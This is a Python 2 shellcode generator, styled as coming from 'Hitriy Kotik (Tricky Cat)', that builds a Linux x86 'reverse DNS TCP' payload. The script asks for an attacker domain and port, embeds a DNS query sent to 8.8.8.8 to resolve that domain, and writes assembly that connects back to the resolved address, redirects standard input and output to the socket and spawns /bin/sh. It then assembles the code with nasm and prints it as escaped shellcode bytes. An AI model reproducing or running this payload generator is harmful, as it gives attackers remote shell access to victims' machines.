#!/usr/bin/python

import sys
import os
import subprocess
import platform

print """ 
; ccccccccclllllllloooooooooodddddddddddddxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdl:;',cdxddxdxxddddddddddddoooooooooolllllllllccccccc
; ccccccllllllllloooooooodddddddddddddxxxxxxxxxxxxxddxxkxxxxxxkkkkxxxxxxxxxxxxxxxxxxxxkxxxxkkxxxxdc,......:dxdxxxxdxddddddddddddddooooooooollllllllccccc
; ccccllllllllooooooooddddddddddddxxxxxxxxxxxxxxxxo;'';coxkkkkxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkxl,.....'..'oxxxxxxxxxxxxdddddddddddooooooooooolllllllccc
; cccllllllloooooooodddddddddddxxxxxxxxxxxxxxxkkkkl. ....,lxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd:.....'',,..cxxxxxxxxxxxxxxxxxddddddddddooooooooollllllcc
; ccllllllooooooodddddddddxxxxxxxxxxxxkkkkkkkkkkkko........,lxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd;.....''',,'.:xkkkxkxxxxxxxxxxxxxxddddddddddoooooooollllll
; llllllooooooodddddddxxxxxxxxxxxxkkkkkkkkkkkkkkkOd,.''......,okOkkkkkkkkkkkkkkkkkkkkkkkkkkko,.......',,,,.;xkkkkkkkkkxxxxxxxxxxxxxddddddddddoooooolllll
; llllooooooodddddddxxxxxxxxxxxkkkkkkkkkkkkkkkkkkOkc..'........:xkkkkkkkkkOOOOOOOOkkkkkkkkkl'.......',;;,'.;xkkkkkkkkkkkkkkxxxxxxxxxxxxddddddddoooooolll
; llloooooooddddddxxxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkOd,.'''..... .'lxkOkkOOOOOOOOOOOkkkkkOOxc.. .....'',,'...:xkOkkkkkkkkkkkkkkkkxxxxxxxxxxxdddddddooooooo
; llooooooddddddxxxxxxxxxxxkkkkkkkkkkkkkkkOOOOOOOOOkc..'.''...   .,ldxxxddxxxxxxddoolccc:'...  .....'''...'lkkOOkkkkkkkkkkkkkkkkkkxxxxxxxxxddddddddooooo
; looooooddddddxxxxxxxxkkkkkkkkkkkkkkkkkkOOOOOOOOOOOd,.........    ...',,,;::::::;,'......   .......''....,dOOOOOOkkkkkkkkkkkkkkkkkxxxxxxxxxxdddddddoooo
; ooooodddddddxxxxxxxkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOl.........      ......''''''.........................'dOOOOOOOOOOOOkkOOkkkkkkkkkkxxxxxxxxdddddddooo
; oooodddddddxxxxxxkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOx,.......................................',,,,'......'oOOOOOOOOOOOOOOOOOkkkkkkkkkkkkxxxxxxdddddddoo
; oooddddddxxxxxxxkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOx,....',;::;:::::::cccclllclloooooooooooddddxxdol;. .;x0OOOOOOOOOOOOOOOOkkkkkkkkkkkkkxxxxxxxxdddddd
; ooddddddxxxxxxxkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOxccodxkOOO00000KKKKKKK00KKK0KKKK0KKKKKKKKKK000K0Kx' 'oOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkkkxxxxxxxxddddd
; ooddddddxxxxxxxkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOkOK00000000000OOOOkkOK000K000kddxdddodddodk0000Kk' .ckOOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkkxxxxxxxdddd
; oddddddxxxxxxxkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOkO0000ko::::;;,'...'dKK00KKKO:............'ckKKKk,..,lkOOOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkxxxxxxxddd
; dddddxxxxxxxxkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOkxk00Oo,.............dKKKKKKKO;..............'d0Kk;...,oOOOOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkxxxxxxxddd
; dddddxxxxxxxxkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOo:xK0o...............oKKKK00K0:..............:x0KO:...'cxOOOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkxxxxxxddd
; dddddxxxxxxxxkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOkl;xK0Oo,...........,lOKKX0OKKKOc'.   .....'ck0KK0o'....;okOOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkxxxxxxxdd
; dddddxxxxxxxxkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOkkOx;.cxOK0kl,..''''.,oOKK0xd:,lk0KKkoccclcccok0K0Oo;......,lkOOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkkxxxxxxdd
; dddddxxxxxxxxkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOx;..':x000OkkkOOOO0KK0d;. ....;d0KKKKKKKKKKKKOd;'.'''''',lkOkOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkkxxxxxxdd
; dddddxxxxxxxxkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOd;....':xOOOOkkxxddoo;..........,:::cc:cllloo:,'''',,,,,;lkOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkkxxxxxxxdd
; dddddxxxxxxxxkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOd;...'..,;;,'........ ..............  ..........''''''',;lxOOOOOOOOOOOOOOOOOkkkkkkkkkkkkkkxxxxxxxddd
; ddddddxxxxxxxxkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOkkd:,,,,,,'''''.... ..;cll:;;'.;oxOOkdl;'.....','..'...'';cdkOkOOOOOOOOOOOOOOkkkkkkkkkkkkkkkxxxxxxxddd
; oodddddxxxxxxxkkkkkkkkkkkkkkkkOOOOOOOOOkkkkkkkkkkOxo;'.............'lk0000KKOxxOK0000000Odlc:lxl'..'...',:oxOOOOOOOOOOOOOOOOOkkkkkkkkkkkkkkkxxxxxxxddd
; ooddddddxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOxc,.....';,'..;oO00000000KOldO0000000000000d,....'',;;:lxkOOOOOOOOOOOOOOkkkkkkkkkkkkkkkxxxxxxxxdddd
; ooodddddxxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOxo;,'....,okkkO00000000kxo;..,cdO0000000Oxl,..'''',;;:cloxkkOkkkkkkkkkkkkkkkkkkkkkkkkxxxxxxxxdddddd
; ooodddddddxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkxol:,''....':dkOO000Okdl'........';cloolc;'..'''',,,;;:ccloxkkkkkkkkkkkkkkkkkkkkkkkkkxxxxxxxdddddddo
; oooodddddddxxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkkkkkOkkxlcc;'.........';:ccc;'... .......................''',;:cccloxkOkkkkkkkkkkkkkkkkkkkkxxxxxxxxddddddooo
; oooooodddddddxxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkkkkkkoc:c:,'..............................'..............',::ccccldkOkkkkkkkkkkkkkkkkkkxxxxxxxxdddddddoooo
; llooooodddddddxxxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkkkxl;;:;;,'...........................................',;::cccc:coxkkkkkkkkkkkkkkkxxxxxxxxxddddddddooooo
; llloooooodddddddxxxxxxxxxxxxkkkkkkkkkkkkkkkkkkkkxl,,,,;;,''.......................................',,;;:::cc:;;:lxxkkkkkkkkkkxxxxxxxxxxxddddddddoooooo
; lllloooooooddddddddxxxxxxxxxxxxxkkkkkkkkkkkkkkkkxc,'''',,,,'..........''''''''''','''............',,,;;:::c:;;,,;cdxkkkkkkkxxxxxxxxxxxdddddddooooooooo
; llllloooooooodddddddddxxxxxxxxxxxxxxkkkkkkkkkkkkxl;'''''''''''.....''''',,,,;;,,,,,'.....        ..',;;;;:::;;,,,;lxxxxxxxxxxxxxxxxxdddddddoooooolllll
; cclllllloooooooodddddddddddxxxxxxxxxxxxxxxxkkkkkxo;''''''...''............'''''''.....           ...';;;::;;;,,,',coxxxxxxxxxxxddddddddddddooooooollll
; cccllllllloooooooooddddddddddxxxxxxxxxxxxxxxxxxxxo:''''''.........................                ...,;;;;;;,,,'',;ldxxxxxxxddddddddddddddddddooooolll
; ccccclllllllooooooooddddddddddddxxxxxxxxxxxxxxxxxdc,''.....................                      ....',,,,,,,,,,,,,:odxddddddddddddooodddddodxoodoolcc
; cccccccllllllllooooooooodddddddddddddddxxxxxxxxxdo:,'''...............                        .......',,,,,,,,,,,,,;coddddddddddoooooooodddoodooooolcc
; :::cccccccclllllllloooooooooodddddddddddddddxxxxdc;,,''............                          ........''',,,,,,,,,,',;codddddooooooooolloodooooollollcc
; ::::ccccccccclllllllloooooooooooddddddddddddddddl;,,'''.........                         ...............'',,,,,,,'''';clooooooooooolllllodooooollllcc:
; :::::::ccccccccclllllllllloooooooooooddddddddddo:,''..........                          ... ............'',,,,'''''''',:cloollolllllllllllllllcllccc::
; :::::::ccccccccccclllllllllloooooooooooooodddddl;'''........                               ...........''''','''''''''.',:clollllllllllcccccccc:cc:::::


"""



print "Hitriy Kotik (Tricky Cat) is my name and I like dealing in shellcode. I have something special in the market place for you! \n\n \
!!!!! A Reverse DNS TCP Payload For Linux !!!!! \n\n Tell Me , a few things and I will generate the shellcode for you!"  


domainname = raw_input("[+] Tell Me The Domain You wish To Connect Back To : ")
LPort      = raw_input("[+] Tell Me The Port   You Wish To Connect Back To : ")

if platform.system() == 'Windows':
    print "[-] I Need To Warn you That You'll Need Some Additional Tools To Use My Magic...\n Make Sure You Have nasm, objdump , and gcc installed \n"

Prefix       = ['AA', 'AA' ,'01', '00','00', '01' ,'00','00','00','00','00','00']
DomainSize   = []
SubDomainSize= []
Suffix       = ['00', '00' , '01', '00' , '01' ,'00','00','00', ]
#00 01 00 00     #00 00 00 01

AlmostEverythingIsLEndian = [] 




lengthOfPayload = 22 + len(domainname.replace(".",""))

#print "Length of DomainName :", lengthOfPayload
#print "Modulus % of Domain Name  " , (lengthOfPayload  % 4 )

if (lengthOfPayload  % 4) == 0:
    pass
    #print "[+] Everything looks good!\n"
elif (lengthOfPayload  % 4) == 3:
    #print "[-] Padding With A Byte \n"
    Suffix.append('00')
elif (lengthOfPayload  % 4) == 2:
    #print "[-] Padding With 2  Bytes \n"
    Suffix.append('00')
    Suffix.append('00')
elif (lengthOfPayload  % 4) == 1:
    #print "[-] Padding With 3  Bytes \n"
    Suffix.append('00')
    Suffix.append('00')
    Suffix.append('00')



ZDomainSize      = len(domainname.split(".")[0])
ZSubDomainSize   = len(domainname.split(".")[1])
SubDomain        = domainname.split(".")[1] 
ZDomainSize      = hex(ZDomainSize)[2:].zfill(2)
ZSubDomainSize   = hex(ZSubDomainSize)[2:].zfill(2)



DomainSize.append(ZDomainSize)
SubDomainSize.append(ZSubDomainSize)



count = 0
bytearray = []
for i in domainname.split(".")[0]:
    byte=( hex(ord(i))[2:] )
    byte = byte.replace('\n','')
    bytearray.append(byte)
 
SubByteArray = []
for i in SubDomain:
    byte=( hex(ord(i))[2:] )
    byte = byte.replace('\n','')
    SubByteArray.append(byte)



EverythingArray = []
RPrefix        = Prefix[::-1]
RDomainSize    = DomainSize[::-1]
Rbytearray     = bytearray[::-1]
RSubDomainSize = SubDomainSize[::-1]
RSuffix        = Suffix[::-1]
RSubByteArray  = SubByteArray[::-1]


def packstuff (stuff):
    for i in stuff:
        EverythingArray.append(i)

packstuff(RSuffix)
packstuff(RSubByteArray)
packstuff(RSubDomainSize)
packstuff(Rbytearray)
packstuff(RDomainSize)
packstuff(RPrefix)


"""
Prefix       = ['AA', 'AA' ,'01', '00','00', '01' ,'00','00','00','00','00','00']
DomainSize   = []
SubDomainSize= []
Suffix    
"""



#print EverythingArray

scount = 0
BreakCount = 0

TotalPayload = len(domainname.replace(".","")) + len(Suffix) + len(SubDomainSize) + len(DomainSize) + len(Prefix)
#print TotalPayload


EndianRequest = []


#sys.stdout.write("push 0x")
EndianRequest.append("  push 0x")
for i in EverythingArray:
   # sys.stdout.write(i )
    EndianRequest.append(i)
    scount = scount + 1
    BreakCount += 1
    if scount == 4:
        #sys.stdout.write("\n")
        EndianRequest.append("\n")
        scount = 0
        #BreakCount += 1
        if BreakCount < TotalPayload:
           #sys.stdout.write("push 0x")
           EndianRequest.append("  push 0x") 

PrintableEndianRequest = ''.join(EndianRequest)

#print PrintableEndianRequest


###### Full ASM Payload:
PayLOAD = """

section     .text
global      main   ;must be declared for linker (ld)

; Special thanks to James Routley For disecting the DNS protocol. 
; https://routley.io/tech/2017/12/28/hand-writing-dns-messages.html
; Special Thanks to Linux Trovalds for the SysCall map Needed for Syscall documentation . 
; https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_32.tbl
; Useful for looking at HEX IP addresses. 
; https://ncalculators.com/digital-computation/ip-address-hex-decimal-binary.htm
; Useful for converting hex to ASCII 
; https://www.rapidtables.com/convert/number/hex-to-ascii.html
; Thanks to  GOUTHAM MADHWARAJ for the reverse shell example. 
; https://barriersec.com/2018/11/linux-x86-reverse-shell-shellcode/



; SOCKETCALL PARAMS You can pass a value to EBX to utilize one of these functions. 

; #define SYS_SOCKET      1               /* sys_socket(2)                */
; #define SYS_BIND        2               /* sys_bind(2)                  */
; #define SYS_CONNECT     3               /* sys_connect(2)               */
; #define SYS_LISTEN      4               /* sys_listen(2)                */
; #define SYS_ACCEPT      5               /* sys_accept(2)                */
; #define SYS_GETSOCKNAME 6               /* sys_getsockname(2)           */
; #define SYS_GETPEERNAME 7               /* sys_getpeername(2)           */
; #define SYS_SOCKETPAIR  8               /* sys_socketpair(2)            */
; #define SYS_SEND        9               /* sys_send(2)                  */
; #define SYS_RECV        10              /* sys_recv(2)                  */
; #define SYS_SENDTO      11              /* sys_sendto(2)                */
; #define SYS_RECVFROM    12              /* sys_recvfrom(2)              */
; #define SYS_SHUTDOWN    13              /* sys_shutdown(2)              */
; #define SYS_SETSOCKOPT  14              /* sys_setsockopt(2)            */
; #define SYS_GETSOCKOPT  15              /* sys_getsockopt(2)            */
; #define SYS_SENDMSG     16              /* sys_sendmsg(2)               */
; #define SYS_RECVMSG     17              /* sys_recvmsg(2)               */
; #define SYS_ACCEPT4     18              /* sys_accept4(2)               */
; #define SYS_RECVMMSG    19              /* sys_recvmmsg(2)              */
; #define SYS_SENDMMSG    20              /* sys_sendmmsg(2)              */


;The Message We want to send.
;AA AA 01 00 00 01 00 00 00 00 00 00 0A 72 6f 6f 74 6b 69 74 64 65 76 03 63 6f 6d 00 00 01 00 01


   ;DNS HEADER;
   ; AA AA - ID
   ; 01 00 - Query parameters
   ; 00 01 - Number of questions
   ; 00 00 - Number of answers
   ; 00 00 - Number of authority records
   ; 00 00 - Number of additional records
   ; DNS QUESTION --
   ; 07 - 'example' has length 7, ;so change this to be the length of domain ; keep in mind there are not '.' in the question.
   ; 65 - e
   ; 78 - x
   ; 61 - a
   ; 6D - m
   ; 70 - p
   ; 6C - l
   ; 65 - e

   ; 03 - subdomain '.com'  length 03  ; change this to be the length of type.

   ; 63 - c
   ; 6F - o
   ; 6D - m

   ; 00    - zero byte to end the QNAME 
   ; 00 01 - QTYPE 
   ; 00 01 - QCLASS

   ; DNS ANSWER!
   ; aa aa
   ; 81 80
   ; 00 01
   ; 00 01
   ; 00 00
   ; 00 00
   ; 07 65
   ; 78 61
   ; 6d 70
   ; 6c 65
   ; 03 63
   ; 6f 6d
   ; 00 00
   ; 01 00
   ; 01 c0
   ; 0c 00
   ; 01 00
   ; 01 00
   ; 00 12
   ; 8d 00
   ; 04 

   ; IP ADDRESS IN HEX -- 93.184.216.34
   ; 5d
   ; b8 
   ; d8
   ; 22



main:                                         
    ; we create a socket fd, using again syscall 0x66 and argument SYS_SOCKET so ebx = 1  
    push   0x66
    pop    eax
    push   0x1 
    pop    ebx
    xor    ecx,ecx
    push   ecx
    ; but this times it will be a SOCK_DGRAM UDP, so 0x2 as argument 
    push   0x2  
    push   0x2 
    mov    ecx,esp
    int    0x80 ; SYS_SOCKET
    ; saving fd on the stack ; In reality I think I will save the port here instead 
    push eax


    push 0x08080808 ; 8.8.8.8 ; I love that this doesn't really need to be backwards.
    ;push 0x0100007F            ; 0100007F 1.0.0.127 for testing...

    xor edx,edx
    mov dh, 0x35  ; port 53; comment this for variable port 
    push dx       ; comment this for variable port 
                  ; push word PORT ; UNcomment this for variable port 
    push word 0x2 ; 




    mov ecx,esp   ; save pointer to ecx 
    push 0x10     ; addrlen 
    push ecx      ; pointer to sockaddr 
    push eax      ; fd received previously 
    mov ecx,esp   ;  
    mov esi,eax   ; save fd for next call 
    xor eax,eax 
    mov al,0x66  
    add bl,0x2   ; BL  = 3 SYS_CONNECT
    int 0x80      ;CALL  SYS_CONNECT


    ; now we send a UDP packet to open stateful firewall :] 
    xor eax,eax
    mov al,0x66   

    ; push 0x00000001 ; Origional Working Example        
    ; push 0x00010000
    ; push 0x6d6f6303
    ; push 0x656c706d
    ; push 0x61786507  ; sizeof (MyDomain) 72 6f 6f 74 6b 69 74 64 65 76 Now we move this in backwards
    ; push 0x00000000
    ; push 0x00000100
    ; push 0x0001AAAA

    {}


    mov edx,esp ; Move the string to EDX so we can send it. 
    xor ecx,ecx
    push ecx  
    push 64 ; size of message to be sent is 8
    push edx 
    push esi 
    mov ecx,esp
    xor ebx,ebx 
    mov bl,0x9 
    int 0x80     ;CALL SYS_SEND

   ; cd ; Change Directional flag. I am not sure if it's needed yet.

    mov eax,  3 ; Prepare for SYSCALL_READ
    mov ebx,  3 ; 
    mov ecx, esp
    mov edx, 100
    int 0x80   ;CALL SYSCALL_READ
    
    add esp, eax
    sub esp, 4 
    mov eax ,[esp]
    push eax ; Probably not needed, I just want to ensure it's saved. 



 ;###################################
 ;
 ;     SET UP FOR REVERSE SHELL!!!
 ;
 ;###################################


    xor edx,edx ; clear out edx
	push 0x66 	; create socket

	pop eax ; syscall for socketcall

	push 0x1 
	pop ebx ; SOCKET_CALL from net.h = 1

	push edx ; push 0
	push ebx ; value of SOCK_STREAM = 1 got it from header /usr/src
	
    pop edx  ; KEEP out IP ADDR
    
    push 0x2 ; value 2 from /usr/include/i386-linux-gnu/bits/socket.h



	mov ecx,esp ; move ecx to top of the stack
	int 0x80 ; call interrupt

	mov esi,eax ; store returning socket in esi for further use


	;connect


	push 0x66
	pop eax           ;syscall for socket_call

	push 0x3
	pop ebx           ; SYS_CONNECT = 3 from /usr/include/linux/net.h



	
	push edx	      ; reverse shell IP 


	push word {}      ; 0x5c11  ; reverse shell port : 4444
	push word 0x2     ; AF_INET = PF_INET = 2
	mov edi, esp	  ; move top of the stack to edi to prepare struct
	push 0x10         ; size = 16
	push edi          ; push the pointer to created struct
	push esi          ; created sock
	mov ecx, esp      ; move top of the stack to ecx
	
	int 0x80          ; call system interrupt 


	;redirect Input, output and error to created sock

	mov ebx,esi
	xor ecx,ecx
	mov cl,0x2 ; initialize counter to 2

redirectIO:
	mov al, 0x3f
	int 0x80
	dec ecx
	jns redirectIO

	                    ; spawn a shell using execve /bin/sh

	push edx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp		; /bin//sh
	mov ecx, edx	    ; NULL
	mov al, 0xb	        ; syscall for execve
	int 0x80


""".format(PrintableEndianRequest, LPort)

print "[+] I Am Making Your PayLoad Right Now...."
f = open("hitriykotik.asm", "w+")
f.write(PayLOAD)
print "[+] ASM Created Successfully....\n"
f.close()


try:
    os.system("nasm -f elf -o hitriykotik.o hitriykotik.asm")  # old and deprecated, it works though....
except OSError as e:
    if e.errno == os.errno.ENOENT:
        print "[-] Something Went Wrong , Do You Have Nasm Installed? \n"
        sys.exit(1)
    else:
        print "[-] Something Went Wrong , I Think Something Broke Using Nasm...\n"
        sys.exit(1)
        raise

try:
    objdump = 'for i in $(objdump -d hitriykotik.o | tr "\t" " " | tr " " "\n" | grep -E "^[0-9a-f]{2}$" ) ; do echo -n "\\x$i" ; done'
    os.system(objdump)
    print "\n"
except OSError as e:
    if e.errno == os.errno.ENOENT:
         print "[-] Something Went Wrong , Do You Have Objdump Installed? \n"
         sys.exit(1)
    else:
        print "[-] Something Went Wrong , I Think Something Broke Using Objdump...\n"
        sys.exit(1)
        raise

